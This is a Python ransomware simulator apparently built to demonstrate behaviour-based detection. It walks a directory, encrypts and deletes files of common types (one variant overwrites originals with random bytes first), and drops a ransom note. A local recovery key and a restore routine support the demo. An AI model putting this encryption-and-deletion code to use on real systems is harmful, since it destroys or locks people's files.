"""
Ransomware Simulator for Zero-Day Detection Demo
Simulates modern ransomware behavior (Double Extortion pattern)
WARNING: This is for EDUCATIONAL PURPOSES ONLY in a controlled environment!
"""
import os
import sys
import time
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import (
    TEST_FILES_DIR, DEMO_DELAY, ENCRYPTION_EXTENSION, 
    RANSOM_NOTE_FILENAME
)
from monitor.monitor import BehaviorMonitor, MonitoredFileOperations


class RansomwareSimulator:
    """
    Simulates ransomware behavior for demonstration purposes.
    Implements the behavioral patterns identified in research papers:
    - Reconnaissance (directory walking)
    - Key generation (crypto API)
    - File encryption (read -> encrypt -> write)
    - Original file deletion
    - Ransom note creation
    """
    
    def __init__(self, target_dir: str = None, delay: float = None):
        self.target_dir = target_dir or TEST_FILES_DIR
        self.delay = delay if delay is not None else DEMO_DELAY
        self.monitor = BehaviorMonitor()
        self.ops = MonitoredFileOperations(self.monitor)
        self.encrypted_files = []
        self.key = None
        
        # File extensions to target
        self.target_extensions = [
            '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp',
            '.mp3', '.mp4', '.avi', '.mov',
            '.zip', '.rar', '.7z',
            '.py', '.java', '.cpp', '.c', '.h'
        ]
    
    def display_banner(self):
        """Display simulator banner."""
        print("\n" + "=" * 60)
        print("  RANSOMWARE SIMULATOR - EDUCATIONAL DEMO")
        print("  WARNING: For controlled environment use only!")
        print("=" * 60)
        print(f"\n  Target Directory: {self.target_dir}")
        print(f"  Delay per file: {self.delay}s")
        print("\n" + "-" * 60)
    
    def reconnaissance(self) -> list:
        """
        Phase 1: Reconnaissance
        Walk target directory and find files to encrypt.
        """
        print("\n[PHASE 1] Reconnaissance - Scanning for files...")
        
        target_files = []
        
        # Use monitored directory listing
        all_files = self.ops.list_directory(self.target_dir)
        
        for file_path in all_files:
            # Skip already encrypted files
            if file_path.endswith(ENCRYPTION_EXTENSION):
                continue
            
            # Check extension
            ext = os.path.splitext(file_path)[1].lower()
            if ext in self.target_extensions or not ext:
                target_files.append(file_path)
        
        print(f"           Found {len(target_files)} files to encrypt")
        return target_files
    
    def generate_key(self) -> bytes:
        """
        Phase 2: Key Generation
        Generate encryption key using crypto APIs.
        Also saves key for potential recovery (simulating key extraction).
        """
        print("\n[PHASE 2] Key Generation - Creating encryption key...")
        
        # Generate random key material (logged as CryptGenRandom)
        key_material = self.ops.generate_random_key(32)
        
        # Create Fernet key from random bytes
        import base64
        self.key = base64.urlsafe_b64encode(key_material)
        
        # Log additional crypto operation
        self.monitor.log_operation(
            api_call="CryptAcquireContext",
            params={"provider": "AES-256"}
        )
        
        # Save key for recovery demonstration
        # In real ransomware, this simulates key extraction from memory
        self._save_key_for_recovery()
        
        print("           Encryption key generated")
        return self.key
    
    def _save_key_for_recovery(self):
        """
        Save the encryption key for recovery demonstration.
        This simulates successful key extraction by the antivirus.
        """
        try:
            recovery_dir = os.path.join(os.path.dirname(self.target_dir), "..", "monitor")
            os.makedirs(recovery_dir, exist_ok=True)
            key_path = os.path.join(recovery_dir, "recovery_key.bin")
            with open(key_path, 'wb') as f:
                f.write(self.key)
        except:
            pass  # Silent fail - key recovery is optional
    
    def encrypt_file(self, file_path: str) -> bool:
        """
        Phase 3: File Encryption
        Read file -> Encrypt -> Write encrypted -> Delete original
        """
        try:
            # Read original file
            original_data = self.ops.read_file(file_path)
            
            if len(original_data) == 0:
                return False
            
            # Encrypt the data
            cipher = Fernet(self.key)
            encrypted_data = cipher.encrypt(original_data)
            
            # Log crypto operation
            self.monitor.log_operation(
                api_call="CryptEncrypt",
                file_path=file_path,
                params={"original_size": len(original_data), "encrypted_size": len(encrypted_data)}
            )
            
            # Write encrypted file with new extension
            encrypted_path = file_path + ENCRYPTION_EXTENSION
            self.ops.write_file(encrypted_path, encrypted_data, original_path=file_path)
            
            # Delete original file
            self.ops.delete_file(file_path)
            
            self.encrypted_files.append({
                "original": file_path,
                "encrypted": encrypted_path
            })
            
            return True
            
        except Exception as e:
            print(f"           [ERROR] Failed to encrypt {file_path}: {e}")
            return False
    
    def create_ransom_note(self):
        """
        Phase 4: Create Ransom Note
        """
        print("\n[PHASE 4] Creating ransom note...")
        
        note_path = os.path.join(self.target_dir, RANSOM_NOTE_FILENAME)
        
        note_content = f"""
================================================================================
                         YOUR FILES HAVE BEEN ENCRYPTED!
================================================================================

All your important files have been encrypted using military-grade AES-256 
encryption. Your files are now inaccessible without the decryption key.

Files encrypted: {len(self.encrypted_files)}

To recover your files, you must:
1. Send 1 Bitcoin to wallet: [DEMO-WALLET-ADDRESS]
2. Email proof of payment to: demo@ransomware.example

================================================================================
                    THIS IS A SIMULATION FOR EDUCATIONAL PURPOSES
                    NO ACTUAL RANSOM IS REQUIRED - THIS IS A DEMO
================================================================================

Encrypted files:
"""
        for i, file_info in enumerate(self.encrypted_files[:10], 1):
            note_content += f"  {i}. {file_info['original']}\n"
        
        if len(self.encrypted_files) > 10:
            note_content += f"  ... and {len(self.encrypted_files) - 10} more files\n"
        
        note_content += """
================================================================================
"""
        
        self.ops.write_file(note_path, note_content.encode('utf-8'))
        print(f"           Ransom note created: {note_path}")
    
    def show_ransom_popup(self):
        """Show ransom popup window (for demo effect)."""
        try:
            root = tk.Tk()
            root.withdraw()
            
            message = f"""YOUR FILES HAVE BEEN ENCRYPTED!

{len(self.encrypted_files)} files have been locked.

This is a SIMULATION for educational purposes.
Your files can be restored by running the restore script.

Click OK to close this message."""
            
            messagebox.showwarning("RANSOMWARE DETECTED - SIMULATION", message)
            root.destroy()
            
        except Exception as e:
            print(f"           [INFO] Could not show popup: {e}")
    
    def run(self, show_popup: bool = True):
        """
        Execute the full ransomware simulation.
        """
        self.display_banner()
        self.monitor.clear_log()
        
        # Phase 1: Reconnaissance
        target_files = self.reconnaissance()
        
        if not target_files:
            print("\n[INFO] No files found to encrypt.")
            print("[INFO] Make sure test files exist in:", self.target_dir)
            return False
        
        # Phase 2: Key Generation
        self.generate_key()
        
        # Phase 3: Encrypt files
        print(f"\n[PHASE 3] Encrypting {len(target_files)} files...")
        
        for i, file_path in enumerate(target_files, 1):
            filename = os.path.basename(file_path)
            print(f"           [{i}/{len(target_files)}] Encrypting: {filename}")
            
            if self.encrypt_file(file_path):
                # Delay for demo visibility
                time.sleep(self.delay)
        
        print(f"\n           Encryption complete: {len(self.encrypted_files)} files locked")
        
        # Phase 4: Create ransom note
        self.create_ransom_note()
        
        # Show popup
        if show_popup:
            self.show_ransom_popup()
        
        print("\n" + "=" * 60)
        print("  RANSOMWARE SIMULATION COMPLETE")
        print("=" * 60)
        print(f"\n  Files encrypted: {len(self.encrypted_files)}")
        print(f"  Behavioral log: {self.monitor.log_path}")
        print(f"  Operations logged: {self.monitor.operation_count}")
        
        return True
    
    def restore_files(self):
        """Restore encrypted files (for demo reset)."""
        print("\n[RESTORE] Restoring encrypted files...")
        
        if not self.key:
            print("[ERROR] No encryption key available. Cannot restore.")
            return False
        
        cipher = Fernet(self.key)
        restored = 0
        
        for file_info in self.encrypted_files:
            try:
                encrypted_path = file_info['encrypted']
                original_path = file_info['original']
                
                if os.path.exists(encrypted_path):
                    with open(encrypted_path, 'rb') as f:
                        encrypted_data = f.read()
                    
                    original_data = cipher.decrypt(encrypted_data)
                    
                    with open(original_path, 'wb') as f:
                        f.write(original_data)
                    
                    os.remove(encrypted_path)
                    restored += 1
                    
            except Exception as e:
                print(f"[ERROR] Failed to restore {file_info['original']}: {e}")
        
        # Remove ransom note
        note_path = os.path.join(self.target_dir, RANSOM_NOTE_FILENAME)
        if os.path.exists(note_path):
            os.remove(note_path)
        
        print(f"[RESTORE] Restored {restored} files")
        return True


class RansomwareVariantB(RansomwareSimulator):
    """
    Zero-Day Variant: Slightly modified ransomware behavior.
    Used to demonstrate that the AI detects behavior, not specific code.
    """
    
    def __init__(self, target_dir: str = None, delay: float = None):
        super().__init__(target_dir, delay)
        # Different timing pattern
        self.delay = (delay if delay is not None else DEMO_DELAY) * 0.7
    
    def display_banner(self):
        print("\n" + "=" * 60)
        print("  RANSOMWARE VARIANT B - ZERO-DAY SIMULATION")
        print("  (Modified behavior pattern for zero-day testing)")
        print("=" * 60)
        print(f"\n  Target Directory: {self.target_dir}")
        print(f"  Delay per file: {self.delay}s (faster variant)")
        print("\n" + "-" * 60)
    
    def encrypt_file(self, file_path: str) -> bool:
        """
        Modified encryption: Different order of operations
        (Write first, then delete - slightly different pattern)
        """
        try:
            # Read original file
            original_data = self.ops.read_file(file_path)
            
            if len(original_data) == 0:
                return False
            
            # Additional recon operation (variant behavior)
            self.monitor.log_operation(
                api_call="GetFileAttributes",
                file_path=file_path,
                params={}
            )
            
            # Encrypt
            cipher = Fernet(self.key)
            encrypted_data = cipher.encrypt(original_data)
            
            self.monitor.log_operation(
                api_call="CryptEncrypt",
                file_path=file_path,
                params={"algorithm": "AES-256-CBC"}  # Different param
            )
            
            # Write encrypted (different extension)
            encrypted_path = file_path + ".crypted"  # Different extension
            self.ops.write_file(encrypted_path, encrypted_data, original_path=file_path)
            
            # Secure delete (overwrite then delete)
            self.ops.write_file(file_path, os.urandom(len(original_data)))
            self.ops.delete_file(file_path)
            
            self.encrypted_files.append({
                "original": file_path,
                "encrypted": encrypted_path
            })
            
            return True
            
        except Exception as e:
            print(f"           [ERROR] {e}")
            return False


def main():
    """Run the ransomware simulator."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Ransomware Simulator for Demo")
    parser.add_argument("--target", type=str, default=TEST_FILES_DIR,
                        help="Target directory to encrypt")
    parser.add_argument("--delay", type=float, default=DEMO_DELAY,
                        help="Delay between file encryptions")
    parser.add_argument("--variant", type=str, choices=['A', 'B'], default='A',
                        help="Ransomware variant (A=standard, B=zero-day)")
    parser.add_argument("--restore", action="store_true",
                        help="Restore files after simulation")
    parser.add_argument("--no-popup", action="store_true",
                        help="Don't show ransom popup")
    
    args = parser.parse_args()
    
    # Create simulator
    if args.variant == 'B':
        simulator = RansomwareVariantB(args.target, args.delay)
    else:
        simulator = RansomwareSimulator(args.target, args.delay)
    
    # Run simulation
    success = simulator.run(show_popup=not args.no_popup)
    
    # Optionally restore
    if success and args.restore:
        input("\nPress Enter to restore files...")
        simulator.restore_files()


if __name__ == "__main__":
    main()
